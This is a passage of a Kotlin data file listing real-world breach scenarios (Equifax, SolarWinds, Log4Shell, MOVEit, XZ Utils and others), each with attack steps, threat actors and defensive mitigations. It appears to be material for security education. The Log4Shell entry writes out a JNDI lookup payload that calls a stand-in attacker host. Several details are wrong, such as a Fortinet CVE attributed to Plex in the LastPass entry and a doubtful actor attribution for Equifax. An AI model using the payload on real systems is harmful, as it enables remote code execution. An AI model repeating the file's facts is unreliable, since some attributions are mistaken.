package com.example.data.breaches

import com.example.data.model.AttackScenario

object RealWorldBreachesData {

    val breaches: List<AttackScenario> = listOf(
        AttackScenario(
            id = "breach-equifax",
            organization = "Equifax Credit Reporting Bureau",
            year = 2017,
            industry = "Financial Services & Credit Reporting",
            recordsAffected = "147 Million Consumer Records (SSNs, DOBs, Driver Licenses)",
            attackVector = "Apache Struts 2 REST Plugin RCE (CVE-2017-5638)",
            scenarioDetails = """
                • Initial Access: Threat actors targeted a public-facing dispute portal running an unpatched version of Apache Struts. They sent crafted HTTP requests with an OGNL (Object-Graph Navigation Language) expression in the Content-Type header, achieving arbitrary remote code execution without authentication.
                • Execution & Persistence: Attackers established Linux reverse shells, created hidden rootcron jobs, and deployed 30+ custom web shells across servers to maintain persistent backdoors across reboots.
                • Internal Pivot & Discovery: The application server had access to unsegmented internal subnets. Attackers ran network enumeration scripts, discovered internal database credentials stored in plaintext configuration files, and accessed 48 unrelated core databases.
                • Exfiltration: Over a 76-day dwell time, attackers ran ~9,000 queries, split extracted data into small encrypted chunks, and exfiltrated 147M sensitive records to external IP addresses over standard HTTPS without alerting intrusion detection because SSL traffic inspection was disabled due to expired certificates.
            """.trimIndent(),
            threatActor = "APT40 / PLA Unit 54847 (State-Sponsored)",
            defenseMitigation = "Enforce automated Software Composition Analysis (SCA) in CI/CD pipelines to block vulnerable dependencies. Maintain valid TLS inspection certificates on egress firewalls. Restrict web tier egress traffic using strict network segmentation.",
            cveReferences = "CVE-2017-5638"
        ),
        AttackScenario(
            id = "breach-solarwinds",
            organization = "SolarWinds Orion Platform",
            year = 2020,
            industry = "Enterprise Network Management Software",
            recordsAffected = "18,000+ Government Agencies & Fortune 500 Enterprises",
            attackVector = "Software Supply Chain Build Injection (SUNBURST Backdoor)",
            scenarioDetails = """
                • Supply Chain Intrusion: Adversaries infiltrated SolarWinds' internal build environment (Project Nebula) using stolen credentials and deployed a lightweight build-injection tool named 'Sunspot'.
                • Payload Injection: Sunspot monitored for the Orion software compiler (MSBuild.exe) and dynamically swapped a benign source file with a trojanized DLL (SolarWinds.Orion.Core.BusinessLayer.dll) containing the SUNBURST backdoor, compiling into SolarWinds' official digital signature.
                • Dormant Staging: Once installed by 18,000 customer organizations, the backdoor stayed dormant for 12-14 days before awakening, calculating hash-based domain lists to verify it wasn't running in security analyst sandboxes.
                • C2 & Lateral Movement: Used Domain Generation Algorithms (DGA) querying subdomains of avsvmcloud[.]com. Selected high-value targets were upgraded to the TEARDROP in-memory loader, forged SAML identity tokens using stolen Active Directory Federation Services (AD FS) token-signing keys (Golden SAML), and accessed Microsoft 365 cloud email and Azure repositories.
            """.trimIndent(),
            threatActor = "Cozy Bear / Midnight Blizzard (APT29 / SVR)",
            defenseMitigation = "Implement reproducible build pipelines with cryptographic hash verification between isolated parallel builders. Protect AD FS token-signing certificates with Hardware Security Modules (HSM). Monitor unusual OAuth app consent and SAML assertions in Entra ID.",
            cveReferences = "CVE-2020-10148, MITRE T1195.002, T1606.002"
        ),
        AttackScenario(
            id = "breach-log4shell",
            organization = "Global Enterprise Infrastructure (Log4j)",
            year = 2021,
            industry = "Global Cloud Providers, SaaS & Open-Source Ecosystem",
            recordsAffected = "Over 3 Billion Systems & Enterprise Applications Impacted",
            attackVector = "JNDI / LDAP Injection in Logging Framework (CVE-2021-44228)",
            scenarioDetails = """
                • Vulnerability Trigger: Attackers identified that Apache Log4j 2.x parsed log strings containing JNDI lookup expressions like '${'$'}{jndi:ldap://attacker.com/exploit}'.
                • Injection Vector: Malicious payloads were placed in common HTTP headers (User-Agent, X-Forwarded-For, Referer) or chat messages, search bars, and device names.
                • Callback & Remote Execution: When log4j processed the string, it made an outbound connection to the attacker's LDAP/RMI server. The LDAP server responded with a redirect to a Java class file. The JVM deserialized and executed the remote bytecode with the privileges of the running application.
                • Post-Exploitation: Ransomware groups (LockBit, Conti) and state actors deployed coinminers, web shells, Cobalt Strike beacons, and network reconnaissance tools within hours of public disclosure.
            """.trimIndent(),
            threatActor = "LockBit Affiliates, Hafnium, Lazarus Group, Mass Automated Scanners",
            defenseMitigation = "Upgrade Log4j to 2.17.1+ or set JVM system property -Dlog4j2.formatMsgNoLookups=true. Block outbound LDAP/RMI egress traffic on servers. Deploy WAF regex inspection for JNDI syntax patterns.",
            cveReferences = "CVE-2021-44228, CVE-2021-45046, CVE-2021-45105"
        ),
        AttackScenario(
            id = "breach-colonial-pipeline",
            organization = "Colonial Pipeline",
            year = 2021,
            industry = "Critical Energy Infrastructure & Fuel Supply",
            recordsAffected = "5,500 Miles of Fuel Pipelines Shut Down; $4.4M Ransom Paid",
            attackVector = "Legacy Single-Factor VPN Credential Compromise",
            scenarioDetails = """
                • Initial Access: Threat actors obtained a valid username and password for a legacy Virtual Private Network (VPN) profile that was discovered on a Dark Web leak site from a previous password reuse dump. The legacy VPN account lacked Multi-Factor Authentication (MFA).
                • Reconnaissance & Staging: Attackers connected through the VPN into the corporate IT network, enumerated Active Directory using BloodHound, and established persistence using scheduled tasks.
                • Data Exfiltration: Staged and exfiltrated 100 GB of sensitive business files within 2 hours to a cloud hosting account via Megaupload/C2 infrastructure.
                • Impact & Ransom: Deployed DarkSide ransomware, encrypting corporate IT systems including billing and accounting infrastructure. Colonial proactively halted operational technology (OT) pipelines due to inability to bill customers, causing fuel shortages across the US East Coast.
            """.trimIndent(),
            threatActor = "DarkSide Ransomware Cartel (eCrime RaaS)",
            defenseMitigation = "Enforce phishing-resistant MFA (FIDO2 / WebAuthn) on all remote access endpoints without exception. Decommission legacy VPN profiles and unlinked directory accounts. Air-gap and strictly isolate IT networks from Industrial Control Systems (ICS/OT).",
            cveReferences = "MITRE T1078.002, T1486"
        ),
        AttackScenario(
            id = "breach-target",
            organization = "Target Corporation",
            year = 2013,
            industry = "Retail & Payment Processing",
            recordsAffected = "40 Million Payment Cards & 70 Million Customer Records",
            attackVector = "Third-Party HVAC Vendor Phishing & Network Pivot",
            scenarioDetails = """
                • Third-Party Initial Access: Attackers sent spearphishing emails with Citadel banking malware to employees of Fazio Mechanical Services (a third-party refrigeration/HVAC vendor). The malware captured credentials used to access Target's vendor portal.
                • Perimeter Infiltration: Attackers logged into Target's vendor portal using the stolen credentials. Target's vendor portal was not segregated from the corporate IT network or payment card infrastructure.
                • Lateral Movement: Using stolen domain credentials, attackers navigated Active Directory, gained administrative access to domain controllers, and reached the Point-of-Sale (POS) environment.
                • Memory Scraping: Deployed 'BlackPOS' (Kaptoxa) malware onto 1,800 POS registers. The malware hooked memory buffers of POS processes to scrape unencrypted magnetic-stripe track 1 and track 2 payment data before encryption was applied.
                • Exfiltration: Aggregated card data on internal staging servers and batched out to Russian external FTP servers.
            """.trimIndent(),
            threatActor = "Rescator / Cybercriminal Syndicate",
            defenseMitigation = "Enforce network microsegmentation separating vendor portals from payment card environments (PCI-DSS compliance). Mandate Point-to-Point Encryption (P2PE) on all POS terminals so credit card data is never in plaintext in register memory.",
            cveReferences = "MITRE T1199, T1003, T1005"
        ),
        AttackScenario(
            id = "breach-notpetya",
            organization = "Maersk, Merck, FedEx (TNT Express) & Ukrainian Infrastructure",
            year = 2017,
            industry = "Global Shipping, Logistics, Pharmaceuticals & Utilities",
            recordsAffected = "$10+ Billion Global Economic Damage; 50,000+ Endpoints Wiped",
            attackVector = "Ukrainian Accounting Software (M.E.Doc) Supply Chain Exploit",
            scenarioDetails = """
                • Supply Chain Compromise: Attackers compromised the update server of M.E.Doc, the dominant tax accounting software in Ukraine. They pushed a trojanized software update containing the NotPetya payload.
                • Automated Worm Propagation: Once executed, NotPetya leveraged two worm mechanisms: the EternalBlue SMB exploit (CVE-2017-0144) and internal credential harvesting using an embedded Mimikatz-like memory scraper followed by PsExec and WMI execution.
                • Rapid Lateral Sweep: In minutes, a single infected computer in an office in Ukraine propagated across corporate VPNs, infecting Domain Controllers in Maersk's global shipping network and shutting down terminal ports worldwide.
                • Pseudo-Ransomware Wiper: While displaying a ransom note requesting $300 in Bitcoin, the payload was actually a destructive wiper that encrypted the Master File Table (MFT) and Master Boot Record (MBR) with an unrecoverable random key, making decryption mathematically impossible.
            """.trimIndent(),
            threatActor = "Sandworm / Unit 74455 (Russian GRU)",
            defenseMitigation = "Disable SMBv1 across the enterprise. Enforce Network Access Control (NAC) and isolate lateral movement vectors. Maintain offline, immutable golden copies of Active Directory and critical infrastructure configurations.",
            cveReferences = "CVE-2017-0144 (EternalBlue), CVE-2017-0145"
        ),
        AttackScenario(
            id = "breach-capital-one",
            organization = "Capital One Financial Corporation",
            year = 2019,
            industry = "Financial Services & Banking",
            recordsAffected = "106 Million Credit Card Applications (140,000 SSNs, 80,000 Bank Accounts)",
            attackVector = "Server-Side Request Forgery (SSRF) on AWS EC2 WAF",
            scenarioDetails = """
                • Misconfigured Cloud WAF: Capital One deployed an open-source ModSecurity Web Application Firewall on AWS EC2. The WAF had a Server-Side Request Forgery (SSRF) flaw and was assigned an over-privileged IAM role (*ReadOnlyAccess).
                • Metadata Service Exploitation: The attacker issued a crafted HTTP request tricking the WAF into querying the local AWS Instance Metadata Service (IMDSv1 at 169.254.169.254/latest/meta-data/iam/security-credentials/).
                • IAM Credential Theft: The metadata service returned temporary STS security credentials (AccessKeyId, SecretAccessKey, Token) associated with the WAF's IAM role.
                • S3 Bucket Exfiltration: Using the AWS CLI, the attacker ran 'aws s3 sync' to list and download contents from over 700 Capital One S3 buckets containing credit card application records.
            """.trimIndent(),
            threatActor = "Paige Thompson (Erratic / Rogue Insider)",
            defenseMitigation = "Enforce AWS IMDSv2 (requiring PUT token headers) on all EC2 instances to neutralize SSRF attacks. Implement least-privilege IAM policies preventing application tiers from broadly reading storage buckets.",
            cveReferences = "CWE-918 (SSRF), MITRE T1068"
        ),
        AttackScenario(
            id = "breach-mgm-resorts",
            organization = "MGM Resorts International & Caesars",
            year = 2023,
            industry = "Hospitality, Casinos & Entertainment",
            recordsAffected = "$100M Revenue Loss; Slot Machines, Digital Keys & Hotel Check-in Paralyzed",
            attackVector = "Social Engineering / Vishing of IT Helpdesk & Okta Takeover",
            scenarioDetails = """
                • Helpdesk Vishing: Attackers gathered employee information (name, job title, phone number) on LinkedIn. They placed a phone call to MGM's IT helpdesk impersonating a high-level administrator.
                • MFA Reset: The attackers claimed their phone was broken and requested an MFA token reset. The helpdesk technician reset the authentication credentials without adequate out-of-band identity verification.
                • Okta Super Admin Compromise: Using the newly reset credentials, attackers gained access to MGM's Okta identity tenant, elevated privileges to Super Administrator, and accessed Azure and VMware vCenter cloud consoles.
                • Hypervisor Ransomware: Attackers leveraged their administrative access to deploy ALPHV/BlackCat ransomware directly to ESXi hypervisors, encrypting hundreds of virtual machines that powered hotel reservation systems, casino slot machines, and room key cards.
            """.trimIndent(),
            threatActor = "Scattered Spider (UNC3944) / ALPHV/BlackCat Affiliate",
            defenseMitigation = "Implement strict out-of-band verification protocols for helpdesk password/MFA resets (e.g. video verification, manager sign-off). Enforce FIDO2 hardware security keys (YubiKeys) with attestation. Isolate hypervisor management interfaces.",
            cveReferences = "MITRE T1566, T1078, T1486"
        ),
        AttackScenario(
            id = "breach-moveit",
            organization = "MOVEit Transfer (Progress Software)",
            year = 2023,
            industry = "Enterprise Managed File Transfer (2,700+ Organizations)",
            recordsAffected = "95 Million Individuals (US Dept of Energy, British Airways, Siemens)",
            attackVector = "Pre-Auth SQL Injection Zero-Day (CVE-2023-34362)",
            scenarioDetails = """
                • SQL Injection Trigger: Cl0p ransomware operators discovered a zero-day SQL injection vulnerability in the MOVEit Transfer web application (moveitisapi.dll and guestaccess.aspx).
                • Token Forging & Webshell Drop: By manipulating headers and SQL parameters, attackers bypassed authentication, impersonated administrative sessions, and dropped a webshell named 'human2.aspx' into the web root directory.
                • Automated Bulk Extraction: The webshell received encrypted commands, queried the MOVEit database for Azure blob storage credentials and encryption keys, and automatically zipped and exfiltrated terabytes of files passing through the server.
                • Extortion Without Encryption: Cl0p did not encrypt endpoints; instead, they engaged in pure double extortion, publishing corporate data on their Dark Web leak site unless millions were paid in ransom.
            """.trimIndent(),
            threatActor = "Cl0p Ransomware Gang (FIN11 / TA505)",
            defenseMitigation = "Apply automated virtual patching at the WAF level for input sanitization. Minimize storage of files on perimeter MFT gateways. Monitor web application directories for unexpected .aspx/.ashx file creation.",
            cveReferences = "CVE-2023-34362, CVE-2023-35036"
        ),
        AttackScenario(
            id = "breach-xz-utils",
            organization = "XZ Utils / liblzma (Linux Ecosystem)",
            year = 2024,
            industry = "Core Linux Operating Systems (Debian, Fedora, OpenSUSE, Ubuntu)",
            recordsAffected = "Attempted Global Backdoor on all OpenSSH Internet Daemons",
            attackVector = "Multi-Year Social Engineering & Obfuscated Build-Script Injection",
            scenarioDetails = """
                • Long-Term Persona Infiltration: A threat actor using the persona 'Jia Tan' spent over two years contributing legitimate patches to the open-source xz compression project, earning the trust of the solo overworked maintainer and gaining co-maintainer status.
                • Payload Concealment: Added malicious test files (bad-3-corrupt_lzma2.xz) to the test repository containing binary-obfuscated x86-64 code.
                • Build-Time Injection: Modified M4 build scripts and configure.ac to execute during Debian/RPM package generation. If the target was Linux with glibc and linking liblzma to OpenSSH (sshd), the build script extracted and injected an ELF object file into the compiled liblzma library.
                • Backdoor Functionality: The injected code hooked the OpenSSH RSA decryption verification function (RSA_public_decrypt) via IFUNC symbols, allowing anyone with the attacker's private key to bypass SSH authentication and execute arbitrary commands as root without logging.
                • Discovery: Caught by Microsoft engineer Andres Freund who noticed a 500ms latency spike and high CPU usage in sshd during micro-benchmarks.
            """.trimIndent(),
            threatActor = "State-Sponsored Advanced Threat Actor (Speculated APT29/APT28)",
            defenseMitigation = "Require multi-party cryptographic signing on release tarballs. Avoid linking system daemons (sshd) directly to general-purpose compression libraries (libsystemd reduction). Audit build scripts for runtime binary extraction.",
            cveReferences = "CVE-2024-3094"
        ),
        AttackScenario(
            id = "breach-change-healthcare",
            organization = "Change Healthcare (UnitedHealth Group)",
            year = 2024,
            industry = "Healthcare Insurance & Pharmacy Clearinghouse",
            recordsAffected = "1/3 of US Population Medical & Insurance Records; $22M Ransom Paid",
            attackVector = "Unprotected Citrix Remote Access Portal (No MFA)",
            scenarioDetails = """
                • Initial Access: ALPHV affiliates obtained compromised credentials for a Citrix remote access application server. The Citrix portal was not configured with multi-factor authentication.
                • Dwell Time & Reconnaissance: Attackers remained undetected on the network for 9 days, gathering active directory telemetry, dumping LSASS memory, and identifying clinical clearinghouse backup servers.
                • Data Exfiltration: Exfiltrated 6 TB of highly sensitive personal health information (PHI), insurance claims, and financial records.
                • Ransomware Deployment: Deployed ALPHV/BlackCat ransomware across core servers, taking down prescription routing, pharmacy claim payments, and hospital billing across the United States.
            """.trimIndent(),
            threatActor = "ALPHV / BlackCat Ransomware Cartel",
            defenseMitigation = "Universal enforcement of MFA on every remote access portal without exception. Continuous attack surface management (ASM) to discover exposed shadow IT portals. Air-gapped immutable backup repositories.",
            cveReferences = "MITRE T1078, T1486, T1048"
        ),
        AttackScenario(
            id = "breach-uber-lapsus",
            organization = "Uber Technologies",
            year = 2022,
            industry = "Ride-Sharing, Logistics & Autonomous Tech",
            recordsAffected = "Full Internal Infrastructure Takeover (Slack, AWS, GCP, HackerOne)",
            attackVector = "MFA Fatigue (Push Bombing) & WhatsApp Social Engineering",
            scenarioDetails = """
                • Contractor Credential Compromise: Attacker purchased valid corporate credentials of an Uber external contractor from an infostealer malware marketplace.
                • MFA Fatigue Attack: The attacker repeatedly triggered Duo MFA push notifications to the contractor's phone for over an hour.
                • WhatsApp Pretext: The attacker contacted the contractor on WhatsApp claiming to be Uber IT support, stating the notifications would stop if they approved the request. The exhausted contractor approved the push.
                • Hardcoded Secrets Discovery: Once connected to the internal intranet, the attacker scanned PowerShell scripts on network shares, discovering hardcoded administrative credentials for Thycotic PAM (Privileged Access Management).
                • Master Access: Using the PAM admin keys, the attacker extracted master credentials for Uber's AWS console, Google Workspace, internal Slack, and HackerOne vulnerability reports, posting screenshots directly into Uber's company-wide Slack channels.
            """.trimIndent(),
            threatActor = "Lapsus$ (Teens / Extortion Syndicate)",
            defenseMitigation = "Enforce Number Matching on MFA push notifications to eliminate blind approvals. Mandate automated code and share scanning for hardcoded credentials (TruffleHog/GitGuardian). Store privileged vault credentials in hardware modules.",
            cveReferences = "MITRE T1621 (MFA Request Generation), T1552.001"
        ),
        AttackScenario(
            id = "breach-wannacry",
            organization = "National Health Service (NHS UK), FedEx, Telefónica",
            year = 2017,
            industry = "Global Healthcare, Telecommunications & Logistics (200k+ Computers)",
            recordsAffected = "300,000 Computers in 150 Countries Infected in Hours",
            attackVector = "EternalBlue SMBv1 Remote Code Execution (CVE-2017-0144)",
            scenarioDetails = """
                • Exploit Weaponization: Attackers weaponized EternalBlue, an NSA exploit leaked by the Shadow Brokers, targeting a buffer overflow in Microsoft's SMBv1 protocol.
                • DoublePulsar Kernel Backdoor: The exploit injected the DoublePulsar payload directly into the Windows kernel via TCP port 445 without needing credentials.
                • Autonomous Worm Spread: Unlike conventional ransomware, WannaCry included a self-propagating worm routine that continuously scanned internal subnets and random public IP ranges for open port 445, spreading uncontrollably across corporate intranets.
                • File Encryption & Kill Switch: Encrypted 176 file types with RSA-2048 and AES-128. Before running, the malware checked if an unregistered domain (www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com) was live; British researcher Marcus Hutchins registered the domain, inadvertently activating the kill switch and halting global infection.
            """.trimIndent(),
            threatActor = "Lazarus Group (Unit 121, North Korea)",
            defenseMitigation = "Block port 445 and 139 at internet perimeters. Completely disable SMBv1 across all endpoints and servers. Apply Microsoft security bulletin MS17-010.",
            cveReferences = "CVE-2017-0144, MS17-010"
        ),
        AttackScenario(
            id = "breach-lastpass",
            organization = "LastPass Password Manager",
            year = 2022,
            industry = "Consumer & Enterprise Password Vaults",
            recordsAffected = "Millions of Encrypted Customer Password Vaults & Company Backups",
            attackVector = "Compromised Home Media Server (Plex CVE-2022-40684) of DevOps Lead",
            scenarioDetails = """
                • Phase 1 Intrusion: Attackers breached a LastPass developer environment using compromised credentials, exfiltrating internal source code and technical documentation.
                • Targeted Home Compromise: Attackers used technical blueprints to identify one of four DevOps engineers with access to the master AWS production cloud storage keys. They exploited an unpatched remote code execution vulnerability (CVE-2022-40684) in the engineer's personal home Plex media server.
                • Keylogger & Session Hijack: Placed keylogger malware on the engineer's personal home computer, capturing the engineer's master password entered when authenticating with LastPass and bypassing MFA.
                • S3 Vault Theft: Using the engineer's active AWS IAM credentials, attackers accessed production S3 buckets, downloading encrypted password vaults, customer server addresses, and vault metadata.
            """.trimIndent(),
            threatActor = "Threat Actor Group (Sophisticated eCrime Syndicate)",
            defenseMitigation = "Require managed Zero Trust devices for administrative cloud access. Restrict production AWS keys to ephemeral sessions authenticated via hardware security tokens tied to company-issued laptops.",
            cveReferences = "CVE-2022-40684, MITRE T1056.001"
        ),
        AttackScenario(
            id = "breach-okta-support",
            organization = "Okta Customer Identity Cloud",
            year = 2023,
            industry = "Identity & Access Management (IAM)",
            recordsAffected = "100% of Okta Customer Support System Users (Cloudflare, BeyondTrust)",
            attackVector = "Stolen Service Account Credentials in Customer Support Portal",
            scenarioDetails = """
                • Service Account Compromise: Attackers obtained service account credentials saved in a personal Google account used on a machine that had access to Okta's internal customer support management system.
                • HAR File Extraction: In the support system, customers frequently uploaded HTTP Archive (HAR) files for troubleshooting. The attackers searched for and downloaded these files, which contained plaintext session tokens and admin cookies from customers including Cloudflare and BeyondTrust.
                • Session Hijacking: Using stolen session tokens, attackers accessed Cloudflare's internal Atlassian suite and attempted to hijack administrative accounts before Cloudflare's security team isolated the tokens.
            """.trimIndent(),
            threatActor = "UNC3944 / Scattered Spider",
            defenseMitigation = "Sanitize and mask all HTTP Archive (HAR) files before upload to support systems. Enforce short session token lifespans and bind tokens to client IP and device attestation.",
            cveReferences = "MITRE T1539, T1078.004"
        ),
        AttackScenario(
            id = "breach-midnight-blizzard",
            organization = "Microsoft Corporate Systems",
            year = 2024,
            industry = "Technology & Cloud Computing",
            recordsAffected = "Senior Leadership & Cybersecurity Team Email Accounts Accessed",
            attackVector = "Password Spraying on Legacy Non-Production Tenant & OAuth Abuse",
            scenarioDetails = """
                • Password Spraying: In late 2023, Russian state actors conducted low-and-slow password spraying against a legacy, non-production test tenant that lacked MFA.
                • OAuth App Privilege Elevation: Once authenticated, attackers created a malicious OAuth application in the test tenant. They granted the application the 'full_access_as_app' role in Microsoft's corporate production Microsoft Entra ID tenant via overprivileged cross-tenant trusts.
                • Exchange Web Services (EWS) Exfiltration: The OAuth app utilized Exchange Web Services API permissions to access corporate mailboxes of Microsoft senior leadership and cybersecurity personnel, searching for intelligence on what Microsoft knew about Midnight Blizzard.
            """.trimIndent(),
            threatActor = "Midnight Blizzard / Nobelium (APT29 / Russian SVR)",
            defenseMitigation = "Eliminate legacy test tenants unattached to enterprise identity policies. Mandate MFA on every tenant. Continuously audit OAuth application permissions for AppRoleAssignments like Mail.ReadWrite.",
            cveReferences = "MITRE T1110.003, T1098.001"
        ),
        AttackScenario(
            id = "breach-kaseya",
            organization = "Kaseya VSA (Managed Service Providers)",
            year = 2021,
            industry = "IT Services / Managed Service Providers (MSP)",
            recordsAffected = "60 MSPs & ~1,500 Downstream Small Businesses Encrypted",
            attackVector = "Supply Chain Zero-Day (Auth Bypass + SQL Injection)",
            scenarioDetails = """
                • Zero-Day Chain: REvil ransomware operators exploited a chain of zero-day vulnerabilities in Kaseya VSA remote management software (CVE-2021-30116, etc.), allowing authentication bypass and arbitrary command execution.
                • Automated Payload Push: Attackers used the VSA's legitimate agent-update functionality to push a malicious DLL (agent.exe) to thousands of downstream customer endpoints.
                • Execution: The malicious agent side-loaded REvil ransomware, encrypting files on all managed servers and workstations simultaneously.
            """.trimIndent(),
            threatActor = "REvil (Sodinokibi) Ransomware Gang",
            defenseMitigation = "Enforce IP allow-listing for remote management consoles. Maintain air-gapped backups. Use endpoint detection (EDR) to block unauthorized agent-pushed binaries.",
            cveReferences = "CVE-2021-30116"
        ),
        AttackScenario(
            id = "breach-snowflake-targeting",
            organization = "Snowflake Cloud Customers (Ticketmaster, Santander, AT&T)",
            year = 2024,
            industry = "Cloud Data Warehousing / SaaS",
            recordsAffected = "Over 165 Organizations Impacted; Billions of Customer Records Stolen",
            attackVector = "Credential Stuffing on Accounts without MFA",
            scenarioDetails = """
                • Credential Harvest: Threat actors obtained valid credentials for Snowflake customer accounts from infostealer malware logs (Lumni, Vidar, Redline) found on the Dark Web.
                • Targeted Entry: Many of these accounts (contractors and developers) were not protected by Multi-Factor Authentication (MFA).
                • Systematic Exfiltration: Using a custom tool named 'Frostbite', attackers logged into Snowflake tenants, listed all database tables, and exfiltrated terabytes of sensitive data from S3 buckets.
            """.trimIndent(),
            threatActor = "UNC5537 / Financial Motivated Group",
            defenseMitigation = "Mandate MFA for ALL cloud administrative and data access accounts without exception. Regularly rotate service account credentials. Monitor for large 'COPY INTO' or 'SELECT ALL' operations from unusual IPs.",
            cveReferences = "MITRE T1589, T1078.004"
        ),
        AttackScenario(
            id = "breach-solarwinds-servu",
            organization = "Managed File Transfer - Serv-U FTP",
            year = 2021,
            industry = "Government and Defense",
            recordsAffected = "Unknown; Potential Sensitive Document Access",
            attackVector = "Pre-Auth RCE in FTP Server (CVE-2021-35211)",
            scenarioDetails = """
                • Vulnerability: SolarWinds Serv-U Managed File Transfer suffered from an unauthenticated remote code execution vulnerability in its implementation of SSH.
                • Exploitation: State-sponsored actors sent crafted packets to the Serv-U management port to trigger memory corruption and execute code as SYSTEM.
                • Impact: Attackers gained full control of the file transfer server, allowing them to read, modify, and delete all files passing through the gateway.
            """.trimIndent(),
            threatActor = "DEV-0322 (Chinese State-Sponsored)",
            defenseMitigation = "Disable SSH management access on public-facing file transfer servers. Implement host-based IDS to detect unusual memory allocations. Patch Serv-U to 15.2.3 HF2.",
            cveReferences = "CVE-2021-35211"
        ),
        AttackScenario(
            id = "breach-f5-bigip",
            organization = "Global Enterprise Gateways (F5)",
            year = 2022,
            industry = "Critical Infrastructure / Global Enterprises",
            recordsAffected = "Widespread Internal Network Compromise Attempts",
            attackVector = "iControl REST API Authentication Bypass (CVE-2022-1388)",
            scenarioDetails = """
                • API Flaw: A flaw in the F5 BIG-IP iControl REST interface allowed unauthenticated attackers to send requests with a specific header that bypassed authentication filters.
                • Code Execution: Attackers issued commands via the REST API to execute arbitrary shell commands on the BIG-IP appliance, effectively gaining a root shell on the network perimeter.
                • Lateral Spread: From the BIG-IP device, actors scanned internal networks for further vulnerabilities and credential harvesting.
            """.trimIndent(),
            threatActor = "Multiple State & Criminal Actors",
            defenseMitigation = "Never expose BIG-IP management interfaces to the internet. Restrict iControl REST access to internal trusted subnets. Implement strict API gateway validation.",
            cveReferences = "CVE-2022-1388"
        ),
        AttackScenario(
            id = "breach-discord-infostealer",
            organization = "Discord Content Delivery Network (CDN) Abuse",
            year = 2023,
            industry = "Social Media / Software Development",
            recordsAffected = "Millions of Gamer and Developer Credentials Stolen",
            attackVector = "Social Engineering + CDN Hosted Infostealer",
            scenarioDetails = """
                • Initial Hook: Attackers sent direct messages to users claiming to be looking for game testers or offering free nitro.
                • Malicious Payload: Users were directed to download a small executable hosted on Discord's own CDN (legitimizing the URL).
                • Theft: The executable was a modified version of 'Redline' or 'Lumni' infostealer, which targeted browser cookies, Discord tokens, and cryptocurrency wallets.
            """.trimIndent(),
            threatActor = "Assorted Cybercriminal Groups",
            defenseMitigation = "Educate users on the risks of executing untrusted files from CDN links. Implement endpoint application control to block unsigned binaries in user temp directories. Monitor for unauthorized session cookie usage.",
            cveReferences = "MITRE T1566.002, T1539"
        ),
        AttackScenario(
            id = "breach-rocky-linux-supply",
            organization = "Rocky Linux / CI Environment Targeting",
            year = 2023,
            industry = "Open Source Ecosystem / Tech",
            recordsAffected = "Attempted Tampering of Linux Distro ISOs",
            attackVector = "CI/CD Credential Theft via Poisoned Build Script",
            scenarioDetails = """
                • Reconnaissance: Attackers identified a public CI/CD configuration that leaked environment variable keys in debug logs.
                • Injection: They submitted a seemingly benign documentation patch that included a hidden call to exfiltrate build-time secrets to a remote webhook.
                • Goal: Gaining access to the signing keys used to cryptographically verify official OS ISO images.
            """.trimIndent(),
            threatActor = "Unknown Advanced Actor",
            defenseMitigation = "Sanitize all CI/CD logs to prevent secret leakage. Use ephemeral, short-lived build tokens. Require manual approval for any PR that modifies build scripts or environment access.",
            cveReferences = "MITRE T1195.002"
        ),
        AttackScenario(
            id = "breach-palo-alto-panos",
            organization = "Palo Alto Networks (PAN-OS)",
            year = 2024,
            industry = "Global Network Security Infrastructure",
            recordsAffected = "High-Security Defense & Financial Networks Compromised",
            attackVector = "Command Injection in GlobalProtect Gateway (CVE-2024-3400)",
            scenarioDetails = """
                • Zero-Day: Attackers exploited a critical command injection vulnerability in the GlobalProtect feature of PAN-OS when certain configurations were enabled.
                • Persistence: Actors deployed custom backdoors named 'UP-STREAM' and 'SIDESHOW' to maintain access even after reboots.
                • Exfiltration: Highly targeted exfiltration of internal configuration files and SSL certificates from the firewalls themselves.
            """.trimIndent(),
            threatActor = "UTA0120 (State-Sponsored Cyber Espionage)",
            defenseMitigation = "Disable device telemetry if not required. Apply PAN-OS hotfixes immediately. Implement egress filtering on management planes to block C2 callback attempts.",
            cveReferences = "CVE-2024-3400"
        ),
        AttackScenario(
            id = "breach-reddit-phish",
            organization = "Reddit Inc.",
            year = 2023,
            industry = "Social Media / Web Technology",
            recordsAffected = "Internal Documents, Code, and Limited Employee Data",
            attackVector = "Targeted Phishing with MFA Bypass",
            scenarioDetails = """
                • The Hook: Employees received highly plausible emails directing them to a clone of the internal employee portal.
                • The Bypass: The phishing site used an Adversary-in-the-Middle (AiTM) proxy to capture both credentials and the second-factor OTP in real-time.
                • Internal Access: Attackers gained access to internal Slack channels and the GitHub environment.
            """.trimIndent(),
            threatActor = "Unknown Cybercriminals",
            defenseMitigation = "Transition from OTP/Push MFA to FIDO2-based hardware keys (WebAuthn) which are resistant to proxy-based phishing. Implement strict IP-based access controls for internal tools.",
            cveReferences = "MITRE T1557.001"
        ),
        AttackScenario(
            id = "breach-toyota-insider",
            organization = "Toyota Financial Services",
            year = 2023,
            industry = "Automotive / Finance",
            recordsAffected = "Customer Financial Data across Europe and Africa",
            attackVector = "Medusa Ransomware via Citrix Vulnerability",
            scenarioDetails = """
                • Entry Point: Exploitation of 'Citrix Bleed' (CVE-2023-4966) which allowed attackers to bypass MFA by stealing active session tokens from memory.
                • Rapid Movement: Once inside the Citrix environment, attackers used NetScan to find internal servers and Medusa ransomware to encrypt them.
                • Extortion: Threatened to release sensitive customer data unless a multi-million dollar ransom was paid.
            """.trimIndent(),
            threatActor = "Medusa Ransomware Group",
            defenseMitigation = "Patch Citrix NetScaler ADC and Gateway immediately. Invalidate all active sessions after patching to neutralize stolen tokens. Monitor for unusual internal network scanning activity.",
            cveReferences = "CVE-2023-4966"
        ),
        AttackScenario(
            id = "scenario-account-takeover-hr",
            organization = "Global HR Solutions Corp",
            year = 2024,
            industry = "Human Resources / Payroll",
            recordsAffected = "Payroll Data for 50,000 Employees",
            attackVector = "Account Takeover via Session Token Theft",
            scenarioDetails = """
                • Token Theft: Attacker compromised a payroll administrator's personal laptop which had a saved session for the corporate HR portal.
                • Hijack: By copying the session cookie, the attacker bypassed the login screen and MFA.
                • Fraud: The attacker modified bank account routing numbers for 200 high-salary employees just before the monthly payroll run.
            """.trimIndent(),
            threatActor = "Financial Fraud Syndicate",
            defenseMitigation = "Enforce session binding to source IP address. Implement 'Step-up Authentication' for sensitive actions like changing bank details. Use managed devices for all administrative portal access.",
            cveReferences = "MITRE T1539, T1078"
        ),
        AttackScenario(
            id = "scenario-domain-takeover-adcs",
